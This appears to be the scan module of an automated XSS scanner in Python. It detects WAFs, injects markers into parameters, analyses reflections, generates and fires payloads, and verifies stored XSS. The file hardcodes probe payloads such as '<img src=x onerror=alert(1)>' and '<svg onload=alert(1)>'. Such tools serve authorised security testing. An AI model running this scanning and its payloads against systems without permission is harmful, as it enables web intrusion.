import copy
import re
from urllib.parse import urlparse, quote, unquote

from core.checker import checker
from core.colors import end, green, que
import core.config
from core.config import xsschecker, minEfficiency
from core.dom import dom
from core.filterChecker import filterChecker
from core.generator import generator
from core.htmlParser import htmlParser
from core.requester import requester
from core.utils import getUrl, getParams, getVar, flattenParams, replaceValue
from core.wafDetector import wafDetector
from core.log import setup_logger
from core.stored_xss_verifier import verify_stored_xss

logger = setup_logger(__name__)


def scan(target, paramData, encoding, headers, delay, timeout, skipDOM, skip):
    GET, POST = (False, True) if paramData else (True, False)
    method = getVar('method')
    if not method:
        method = 'GET' if GET else 'POST'
    # If the user hasn't supplied the root url with http(s), we will handle it
    if not target.startswith('http'):
        try:
            response = requester('https://' + target, {},
                                 headers, method, delay, timeout)
            target = 'https://' + target
        except:
            target = 'http://' + target
    logger.debug('Scan target: {}'.format(target))

    response = requester(target, {}, headers, method, delay, timeout).text
    
    # Determine which URL to use for reflection/DOM checks
    # For non-GET methods with verifyUrl, use verifyUrl for checking reflections/DOM
    use_verify_for_reflection_dom = (core.config.verifyUrl and not GET)
    check_url = core.config.verifyUrl if use_verify_for_reflection_dom else target

    if use_verify_for_reflection_dom:
        logger.debug('Using verify URL for DOM check: {}'.format(check_url))
        response = requester(check_url, {}, headers, core.config.verifyMethod, delay, timeout).text

    # DOM XSS check (only if we have HTML response)
    if not skipDOM:
        logger.run('Checking for DOM vulnerabilities')
        highlighted = dom(response)
        if highlighted:
            logger.good('DOM XSS Detected!')
            logger.good('Potentially vulnerable objects found')
            logger.red_line(level='good')
            for line in highlighted:
                logger.no_format(line, level='good')
            logger.red_line(level='good')
    
    host = urlparse(target).netloc  # Extracts host out of the url
    logger.debug('Host to scan: {}'.format(host))
    url = getUrl(target, GET)
    logger.debug('Url to scan: {}'.format(url))
    params = getParams(target, paramData, GET)
    logger.debug_json('Scan parameters:', params)
    if not params:
        logger.error('No parameters to test.')
        quit()
    WAF = wafDetector(
        url, {list(params.keys())[0]: xsschecker}, headers, method, delay, timeout)
    if WAF:
        logger.error('WAF detected: %s%s%s' % (green, WAF, end))
    else:
        logger.good('WAF Status: %sOffline%s' % (green, end))

    for paramName in params.keys():
        paramsCopy = copy.deepcopy(params)
        logger.info('Testing parameter: %s' % paramName)
        if encoding:
            paramsCopy[paramName] = encoding(xsschecker)
        else:
            paramsCopy[paramName] = xsschecker
        
        # Inject payload into target URL
        inject_response = requester(url, paramsCopy, headers, method, delay, timeout)
        
        # Check for reflections
        # For non-GET methods with verifyUrl, check reflections on verifyUrl
        if use_verify_for_reflection_dom:
            logger.debug('Using verify URL for reflection check: {}'.format(check_url))
            check_response = requester(check_url, {}, headers, 'GET', delay, timeout)
        else:
            check_response = inject_response
        
        occurences = htmlParser(check_response, encoding)
        positions = occurences.keys()
        logger.debug('Scan occurences: {}'.format(occurences))
        
        # ===== Reflected/DOM XSS Detection Flow =====
        has_reflection = len(occurences) > 0
        reflected_xss_tested = False
        
        if has_reflection:
            logger.info('Reflections found: %i' % len(occurences))
            reflected_xss_tested = True
            
            # Test reflected XSS
            _test_reflected_xss(
                url, paramsCopy, headers, method, delay, timeout, encoding,
                occurences, check_response.text, check_url, use_verify_for_reflection_dom,
                paramName, params, GET, skip
            )
        else:
            logger.error('No reflection found for reflected XSS detection')
        
        # ===== Stored XSS Detection Flow (Independent) =====
        if core.config.verifyUrl:
            logger.run('Testing for stored XSS')
            _test_stored_xss(
                url, paramsCopy, headers, method, delay, timeout,
                paramName, params, GET, skip
            )
        
        logger.no_format('')


def _test_reflected_xss(url, paramsCopy, headers, method, delay, timeout, encoding,
                        occurences, response_text, check_url, use_verify_for_reflection_dom,
                        paramName, params, GET, skip):
    """Test for reflected XSS vulnerabilities"""
    logger.run('Analysing reflections')
    positions = occurences.keys()
    efficiencies = filterChecker(
        check_url if use_verify_for_reflection_dom else url, 
        paramsCopy if not use_verify_for_reflection_dom else {},
        headers, 
        'GET' if use_verify_for_reflection_dom else method, 
        delay, occurences, timeout, encoding
    )
    logger.debug('Scan efficiencies: {}'.format(efficiencies))
    logger.run('Generating payloads')
    vectors = generator(occurences, response_text)
    total = 0
    for v in vectors.values():
        total += len(v)
    if total == 0:
        logger.error('No vectors were crafted.')
        return
    logger.info('Payloads generated: %i' % total)
    progress = 0
    skip_current_param = False
    
    for confidence, vects in vectors.items():
        if skip_current_param:
            break
        for vect in vects:
            if skip_current_param:
                break
            if core.config.globalVariables['path']:
                vect = vect.replace('/', '%2F')
            loggerVector = vect
            progress += 1
            logger.run('Progress: %i/%i\r' % (progress, total))
            if not GET:
                vect = unquote(vect)
            
            # Inject payload and check on appropriate URL
            if use_verify_for_reflection_dom:
                # Inject to target, check on verify URL
                from core.utils import replaceValue
                requester(url, replaceValue(paramsCopy, xsschecker, vect, copy.deepcopy), 
                         headers, method, delay, timeout)
                efficiencies, snippets = checker(
                    check_url, {}, headers, 'GET', delay, vect, positions, timeout, encoding)
            else:
                # Standard reflected XSS check
                efficiencies, snippets = checker(
                    url, paramsCopy, headers, method, delay, vect, positions, timeout, encoding)
            
            if not efficiencies:
                for i in range(len(occurences)):
                    efficiencies.append(0)
                    snippets.append('')
            bestEfficiency = max(efficiencies)
            
            if bestEfficiency > minEfficiency or (vect[0] == '\\' and bestEfficiency >= 95):
                index = efficiencies.index(bestEfficiency)
                occurenceList = list(occurences.values())
                
                if index >= len(occurenceList) or index >= len(snippets):
                    logger.warning('Index mismatch detected, skipping this payload')
                    continue
                
                bestSnippet = snippets[index]
                bestContext = occurenceList[index]['context']

                logger.red_line()
                logger.good('Reflected XSS Detected!')
                logger.good('Payload: %s' % loggerVector)
                logger.info('Parameter: %s' % paramName)
                logger.info('Context: %s' % bestContext)
                logger.info('Efficiency: %i' % bestEfficiency)
                logger.info('Confidence: %i' % confidence)
                if GET:
                    logger.info('Reproduction: %s%s' % (url, flattenParams(paramName, params, loggerVector)))
                elif use_verify_for_reflection_dom:
                    logger.info('Injection URL: %s' % url)
                    logger.info('Reflection URL: %s' % check_url)
                
                bestSnippet = bestSnippet.replace('st4r7s', '').replace('3nd', '')
                logger.info('Reflection: %s' % bestSnippet)
                logger.red_line()

                if bestEfficiency == 100 or (vect[0] == '\\' and bestEfficiency >= 95):
                    if not skip:
                        choice = input(
                            '%s Would you like to continue scanning? [y/N] ' % que).lower()
                        if choice != 'y':
                            quit()
                    else:
                        logger.info('Skipping remaining payloads for parameter: %s' % paramName)
                        skip_current_param = True
                        break


def _test_stored_xss(url, paramsCopy, headers, method, delay, timeout,
                     paramName, params, GET, skip):
    """Test for stored XSS vulnerabilities independently"""
    from core.generator import generator
    from core.config import getPayloadConfig
    
    # Generate payloads for stored XSS testing
    # Use a simplified context since we don't have reflection info
    config = getPayloadConfig()
    
    # Create a basic set of high-confidence payloads for stored XSS
    stored_vectors = []
    for tag in config['tags']:
        for eventHandler in config['eventHandlers']:
            if tag in config['eventHandlers'][eventHandler]:
                for function in config['functions']:
                    if tag == 'script' and eventHandler == 'direct':
                        stored_vectors.append('<%s>%s</%s>' % (tag, function, tag))
                    elif eventHandler != 'direct':
                        stored_vectors.append('<%s %s=%s>' % (tag, eventHandler, function))
    
    # Add some common stored XSS payloads
    stored_vectors.extend([
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '\"><script>alert(1)</script>',
        '\' onmouseover=alert(1) ',
    ])
    
    total = len(stored_vectors)
    logger.info('Testing %i stored XSS payloads' % total)
    progress = 0
    skip_current_param = False
    
    for vect in stored_vectors:
        if skip_current_param:
            break
        
        if core.config.globalVariables['path']:
            vect = vect.replace('/', '%2F')
        loggerVector = vect
        progress += 1
        logger.run('Progress: %i/%i\r' % (progress, total))
        
        if not GET:
            test_vect = unquote(vect)
        else:
            test_vect = vect
        
        # Inject payload
        inject_params = replaceValue(paramsCopy, xsschecker, test_vect, copy.deepcopy)
        requester(url, inject_params, headers, method, delay, timeout)
        
        # Verify stored XSS
        stored_xss_found, stored_xss_method, stored_xss_context = verify_stored_xss(
            core.config.verifyUrl,
            core.config.verifyMethod,
            test_vect,
            delay,
            timeout,
            use_js_render=core.config.jsRender
        )
        
        if stored_xss_found:
            logger.red_line()
            logger.good('Stored XSS Detected!')
            logger.good('Payload: %s' % loggerVector)
            logger.info('Parameter: %s' % paramName)
            logger.info('Injection URL: %s' % url)
            logger.info('Verification URL: %s' % core.config.verifyUrl)
            logger.info('Detection Method: %s' % stored_xss_method)
            
            if stored_xss_method and 'interactive' in stored_xss_method:
                logger.info('Trigger Type: %s (requires user interaction)' % stored_xss_method.replace('interactive_', ''))
            else:
                logger.info('Trigger Type: Immediate (on page load)')
            
            if stored_xss_context:
                context_preview = stored_xss_context[:200] if len(stored_xss_context) > 200 else stored_xss_context
                logger.info('Context: %s' % context_preview.replace('st4r7s', '').replace('3nd', ''))
            
            logger.red_line()
            
            if not skip:
                choice = input(
                    '%s Stored XSS found! Would you like to continue scanning? [y/N] ' % que).lower()
                if choice != 'y':
                    quit()
            else:
                logger.info('Skipping remaining payloads for parameter: %s' % paramName)
                skip_current_param = True
                break
